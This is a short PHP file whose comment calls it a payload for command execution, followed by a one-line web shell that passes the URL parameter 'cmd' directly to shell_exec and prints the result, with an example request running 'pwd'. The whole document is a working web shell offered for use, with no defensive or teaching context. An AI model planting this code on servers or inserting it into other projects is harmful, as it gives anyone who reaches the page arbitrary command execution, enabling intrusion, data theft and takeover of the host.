// Description
// -----------
// This payload allows command execution when the page is accessed.
// example.com/payload.php?cmd="pwd"
//
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
